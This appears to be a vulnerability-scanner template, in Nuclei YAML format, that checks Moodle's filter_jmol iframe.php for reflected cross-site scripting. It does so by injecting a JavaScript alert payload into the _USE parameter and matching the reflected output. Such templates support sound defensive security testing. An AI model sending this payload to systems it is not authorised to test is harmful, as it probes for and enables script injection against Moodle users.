id: moodle-filter-jmol-xss
info:
  author: madrobot
  name: Moodle filter_jmol XSS
  severity: medium
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - \"};alert(1337);//
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/filter/jmol/iframe.php?_USE=%22};alert(1337);//'
